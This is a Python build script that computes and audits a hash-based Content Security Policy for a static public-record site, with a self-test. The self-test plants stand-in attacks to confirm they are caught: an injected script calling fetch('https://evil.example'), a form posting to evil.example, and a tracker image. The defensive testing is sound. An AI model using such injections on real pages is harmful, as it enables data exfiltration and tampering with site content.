#!/usr/bin/env python3
"""csp.py — the Content Security Policy, computed from the page it protects.

WHY THIS EXISTS AT ALL

GitHub Pages serves this site and **GitHub Pages cannot set response headers**. Every hardening
header a static site would normally carry is therefore unavailable: no `X-Content-Type-Options`,
no `Referrer-Policy`, no `X-Frame-Options`. A `<meta http-equiv>` policy is the one lever the
platform leaves, so it is the one this build pulls.

WHAT IT IS DEFENDING. This site is a public RECORD, and the attack that actually hurts a record
is not theft, it is silent modification. A script injected into a page here could rewrite a
comment deadline, a county, or a megawatt figure, and the site's whole claim is that its numerals
are computed and checkable. A policy that refuses to run a script this build did not produce is
the mechanism behind that claim holding in a reader's browser.

HASHES, NOT `'unsafe-inline'`

The easy version of this file allows `'unsafe-inline'` and protects nothing, because the injected
script is inline too. Measured before writing it: the whole site carries **7 distinct inline
scripts and 1 inline style**, which is small enough to enumerate. So every inline block is hashed
and named explicitly, and `script-src` never carries `'unsafe-inline'`. An injected `<script>` has
a hash nobody authorised and does not run.

The hashes are computed **per page, from the page's own final bytes**, after everything has been
assembled. That is the only ordering that cannot drift: the thing hashed and the thing served are
the same string. One of those scripts is 132KB of inlined ask index that changes daily, which is
exactly why the hash is computed at build time rather than written down anywhere.

TWO HONEST LIMITS, STATED RATHER THAN PAPERED OVER

  `frame-ancestors` IS IGNORED IN A META TAG. Browsers only honour it from a real header, so this
  policy does NOT carry it and this site has no clickjacking defence. Writing it here anyway would
  read as protection to the next person and deliver none. The fix is a header, which needs a proxy
  in front of Pages, and that is a decision rather than a build change.

  `style-src-attr 'unsafe-inline'` IS PRESENT AND IS A REAL CONCESSION. The build emits 68 inline
  `style=""` attributes and each would otherwise need its own hash. Style injection is a defacement
  and a phishing primitive rather than script execution, so it is the weaker half to give up, and
  it is named here so nobody assumes the policy is tighter than it is.

  csp.py --self-test

Exit 0 ok, 1 a check failed, 2 could not run.
"""
from __future__ import annotations

import base64
import hashlib
import re
import sys

# Inline blocks, and the src= test that separates "inline" from "external".
_SCRIPT = re.compile(r"<script([^>]*)>(.*?)</script\s*>", re.S | re.I)
_STYLE = re.compile(r"<style([^>]*)>(.*?)</style\s*>", re.S | re.I)
_HAS_SRC = re.compile(r"\bsrc\s*=", re.I)

# EXTERNAL ORIGINS THIS SITE ACTUALLY LOADS FROM, each with the reason, because an allowlist
# nobody can justify line by line is an allowlist that only grows.
SCRIPT_HOSTS = (
    "https://challenges.cloudflare.com",   # the scan form's Turnstile widget
)
FRAME_HOSTS = (
    "https://challenges.cloudflare.com",   # Turnstile renders in an iframe
)
IMG_HOSTS = (
    "https://raw.githubusercontent.com",   # the article pages' shipped carousel slides
)
# THE TWO WORKERS THIS SITE TALKS TO, DEFINED HERE AND IMPORTED BY THE CODE THAT CALLS THEM,
# rather than typed in both places. That is the same lesson as `site_url` below, learned the
# same way and one commit later: the ask box's endpoint lived in ask_written.py, the policy
# kept its own list here, and the two disagreed the moment the policy shipped, so every
# submitted question on the homepage was refused by the browser. An allowlist that is a second
# copy of the truth is a list that will be wrong.
ASK_ORIGIN = "https://texas-ask.talon-sturgill.workers.dev"
SCAN_ORIGIN = "https://texas-scan.talon-sturgill.workers.dev"

# POST targets. `connect-src` covers fetch/XHR, `form-action` covers a real form submit.
CONNECT_HOSTS = (
    "https://formsubmit.co",
    "https://challenges.cloudflare.com",   # Turnstile calls home from the page, not only in
                                           # its iframe, which is Cloudflare's own guidance
    ASK_ORIGIN,     # the ask box's written lane
    SCAN_ORIGIN,    # the scan gatekeeper, the watch page's feed, and nothing else
)
FORM_HOSTS = (
    "https://formsubmit.co",
)


def _sha256(body: str) -> str:
    return "'sha256-" + base64.b64encode(
        hashlib.sha256(body.encode("utf-8")).digest()).decode("ascii") + "'"


def inline_scripts(html: str) -> list[str]:
    """Every inline script body, INCLUDING `application/ld+json`.

    The JSON-LD blocks are data rather than code and most browsers never execute them, so in
    theory they need no hash. They are hashed anyway. The cost is one token per block and the
    alternative is relying on a browser behaviour that differs between engines, on the one gate
    whose failure mode is a blank page for a reader.
    """
    return [b for a, b in _SCRIPT.findall(html) if not _HAS_SRC.search(a)]


def executable_scripts(html: str) -> list[str]:
    """The inline scripts a browser actually RUNS, so ld+json data is not read as behaviour."""
    return [m.group(2) for m in re.finditer(
        r"<script([^>]*)>(.*?)</script>", html, re.DOTALL)
        if "application/ld+json" not in m.group(1)]


def inline_styles(html: str) -> list[str]:
    return [b for a, b in _STYLE.findall(html) if not _HAS_SRC.search(a)]


def policy(html: str) -> str:
    """The policy for exactly this page, from exactly this page's bytes."""
    s_hashes = " ".join(dict.fromkeys(_sha256(b) for b in inline_scripts(html)))
    c_hashes = " ".join(dict.fromkeys(_sha256(b) for b in inline_styles(html)))
    return "; ".join(d for d in [
        "default-src 'self'",
        "base-uri 'self'",
        "object-src 'none'",
        f"script-src 'self' {s_hashes} {' '.join(SCRIPT_HOSTS)}".replace("  ", " ").strip(),
        f"style-src 'self' {c_hashes}".strip(),
        # Named separately so the concession is visible rather than buried in `style-src`.
        "style-src-attr 'unsafe-inline'",
        f"img-src 'self' data: {' '.join(IMG_HOSTS)}",
        "font-src 'self'",
        f"connect-src 'self' {' '.join(CONNECT_HOSTS)}",
        f"frame-src {' '.join(FRAME_HOSTS)}",
        f"form-action 'self' {' '.join(FORM_HOSTS)}",
    ])


def apply(html: str) -> str:
    """Insert the policy directly after `<head>`.

    IT GOES FIRST, before any other tag in the head. A meta policy governs only what the parser
    meets AFTER it, so a policy placed further down would leave everything above it unprotected,
    which is the failure that makes a meta CSP look like it is working when it is not.
    """
    meta = f'<meta http-equiv="Content-Security-Policy" content="{policy(html)}">'
    return html.replace("<head>", "<head>\n" + meta, 1)


# ------------------------------------------------------------------ the gate
# A CSP is the one addition whose failure is SILENT AND TOTAL: get it wrong and a reader's browser
# refuses the site's own scripts, the page half works, and nothing in this build goes red. So the
# policy is not trusted, it is checked, against the same bytes that shipped.
_RES = {
    "script-src": r'<script[^>]+src="([^"]+)"',
    "img-src": r'<img[^>]+src="([^"]+)"',
    "frame-src": r'<iframe[^>]+src="([^"]+)"',
    "form-action": r'<form[^>]+action="([^"]+)"',
}

# CONNECT-SRC IS THE DIRECTIVE THE AUDIT COULD NOT SEE, and it is the one that broke first.
# Every pattern above reads an HTML attribute, and a fetch target is not an attribute: it is a
# string inside a script, or a data-* the script reads. So the policy shipped refusing the ask
# box's own worker and nothing here noticed, because nothing here was looking.
#
# Read from QUOTED STRINGS ONLY, deliberately. A url in a comment is not a url this page calls,
# and a checker that fails on prose teaches people to allowlist hosts they never contact.
_CONNECT_ATTR = re.compile(r'data-endpoint="(https?://[^"]+)"')
_CONNECT_STR = re.compile(r"""["'](https?://[^"'\s]+)["']""")
# A FORM ACTION IS A CONNECT TARGET TOO whenever a script intercepts the submit and posts it
# itself, which is what the feedback dialog does with formsubmit's ajax address. Nothing here
# can tell a native submit from an intercepted one, so an action counts as targeted for both
# directives. That over-counts in the OBSERVED direction only, which can make the unused check
# below more forgiving and can never invent a target the page does not have.
_CONNECT_FORM = re.compile(r'<form[^>]+action="(https?://[^"]+)"')


def connect_targets(html: str) -> set[str]:
    """Every origin this page could send a fetch or an intercepted form post to.

    READ FROM QUOTED STRINGS AND ATTRIBUTES ONLY, never from comments. A url in a comment is not
    a url this page calls, and a checker that fails on prose teaches people to allowlist hosts
    they never contact, which is how an allowlist gets padded until it means nothing.
    """
    urls = _CONNECT_ATTR.findall(html) + _CONNECT_FORM.findall(html)
    # CODE ONLY. `inline_scripts` deliberately returns the JSON-LD blocks too, because they are
    # hashed, and they are full of urls that are DESCRIBED rather than called: a license, an
    # @id, the canonical address of the page itself. Auditing those as fetch targets asks
    # somebody to allowlist creativecommons.org.
    for body in executable_scripts(html):
        urls += _CONNECT_STR.findall(body)
    return {"/".join(u.split("/")[:3]) for u in urls}


def unused_connect(seen: set[str]) -> list[str]:
    """Declared origins that no page anywhere targets.

    THE CHECK RUNS BOTH WAYS, and this is the half that is easy to leave out. An allowlist only
    means something while every entry is load bearing: the entry for the scan intake outlived
    the intake by a day and nobody noticed, because an over-wide policy refuses nothing and so
    reports nothing.

    It is a DECLARED list checked against observation, not a list derived from observation. The
    difference is the whole point of the policy: if the allowlist were built from what the pages
    reference, an injected `fetch("https://evil")` would authorise itself at build time and this
    gate would go green on a compromised page.
    """
    return [f"connect-src declares {h}, and no page on the site targets it. An allowlist entry "
            f"nothing uses widens the policy for free, so either something should be calling "
            f"it or it should go." for h in CONNECT_HOSTS if h not in seen]


def audit(html: str, site_url: str) -> list[str]:
    """Everything this page loads or posts to that its own policy would refuse.

    `site_url` IS PASSED IN AND IS NOT A CONSTANT HERE, and the reason is written in CLAUDE.md
    under The public URL. The site address is stated once and every surface that kept its own
    copy of it drifted, three separate times, across a config file, a slide renderer, an email
    builder and four collector User-Agents. The first draft of this file made it a fourth by
    hardcoding the domain on the same-origin test below. It reads `site_build.SITE_URL` now,
    which is the one string, so this checker cannot be the surface that disagrees.
    """
    m = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]*)">', html)
    if not m:
        return ["no Content-Security-Policy meta tag on the page"]
    pol = m.group(1)
    if pol.index("script-src") < pol.index("default-src"):
        return ["default-src must come first so a later directive can only narrow it"]

    out = []
    # EVERY INLINE BLOCK IS AUTHORISED BY THE POLICY ON ITS OWN PAGE. This is the check that
    # catches the real failure: a build step that edits a script after the hash was taken.
    for body in inline_scripts(html):
        if _sha256(body) not in pol:
            out.append(f"an inline script is not hashed in the policy ({len(body)} bytes)")
    for body in inline_styles(html):
        if _sha256(body) not in pol:
            out.append(f"an inline style is not hashed in the policy ({len(body)} bytes)")

    for directive, pat in _RES.items():
        allowed = re.search(rf"(?:^|; ){re.escape(directive)} ([^;]*)", pol)
        allowed = allowed.group(1) if allowed else ""
        for url in re.findall(pat, html):
            if not url.startswith(("http://", "https://", "//")):
                continue                      # relative, covered by 'self'
            origin = "/".join(url.split("/")[:3])
            if origin.rstrip("/") == site_url.rstrip("/"):
                continue                      # same origin written absolute
            if origin not in allowed:
                out.append(f"{directive} would refuse {origin}")

    connect = re.search(r"(?:^|; )connect-src ([^;]*)", pol)
    connect = connect.group(1) if connect else ""
    for origin in connect_targets(html):
        if origin.rstrip("/") == site_url.rstrip("/"):
            continue
        if origin not in connect:
            out.append(f"connect-src would refuse {origin}")
    return sorted(set(out))


def self_test() -> int:
    fails = 0
    # The fixture's own origin. The real one arrives from `site_build.SITE_URL`.
    SELF = "https://example.test"


    def ok(label, cond, extra=""):
        nonlocal fails
        print(f"  {'ok  ' if cond else 'FAIL'}  {label}{'' if cond else '  ' + str(extra)}")
        if not cond:
            fails += 1

    page = ('<!doctype html><html><head><title>t</title>'
            '<style>.a{color:red}</style>'
            '<script type="application/ld+json">{"@type":"Thing"}</script></head>'
            '<body><p style="color:red">x</p>'
            '<script>var a=1;</script>'
            '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js"></script>'
            '<img src="https://raw.githubusercontent.com/x/y.png">'
            '<form action="https://formsubmit.co/abc"></form></body></html>')
    out = apply(page)

    ok("the policy lands first inside the head, before anything it must govern",
       out.index("Content-Security-Policy") < out.index("<title>"))
    ok("a real page passes its own audit", not audit(out, SELF), str(audit(out, SELF)))
    ok("script-src never carries 'unsafe-inline', which is the whole point",
       "'unsafe-inline'" not in policy(page).split("style-src-attr")[0])
    ok("every inline script is hashed, ld+json included",
       all(_sha256(b) in policy(page) for b in inline_scripts(page))
       and len(inline_scripts(page)) == 2)
    ok("an external script that IS loaded is allowed",
       "https://challenges.cloudflare.com" in policy(page))

    # THE GATE HAS TO GO RED, or it is decoration. Each case is a real way this breaks.
    tampered = out.replace("var a=1;", "var a=2;")
    ok("a script edited after the hash was taken is caught",
       any("inline script is not hashed" in x for x in audit(tampered, SELF)), str(audit(tampered, SELF)))

    injected = out.replace("</body>", "<script>fetch('https://evil.example')</script></body>")
    ok("an injected inline script is caught",
       any("inline script is not hashed" in x for x in audit(injected, SELF)))

    foreign = out.replace("</body>", '<img src="https://tracker.example/p.gif"></body>')
    ok("an image from an origin nobody allowed is caught",
       any("img-src would refuse https://tracker.example" in x for x in audit(foreign, SELF)),
       str(audit(foreign, SELF)))

    exfil = out.replace("</body>", '<form action="https://evil.example/x"></form></body>')
    ok("a form posting somewhere nobody allowed is caught",
       any("form-action would refuse https://evil.example" in x for x in audit(exfil, SELF)))

    ok("a page with no policy at all is caught",
       audit(page, SELF) == ["no Content-Security-Policy meta tag on the page"])

    # The two limits this file admits to, asserted so a future edit cannot quietly reverse them.
    ok("frame-ancestors is absent, because a meta tag cannot deliver it",
       "frame-ancestors" not in policy(page))
    ok("the style attribute concession is explicit and is scoped to attributes only",
       "style-src-attr 'unsafe-inline'" in policy(page))

    print(f"\ncsp self-test: {'all passed' if not fails else f'{fails} FAILED'}")
    return 1 if fails else 0


def main() -> int:
    if len(sys.argv) == 2 and sys.argv[1] == "--self-test":
        return self_test()
    print("usage: csp.py --self-test", file=sys.stderr)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
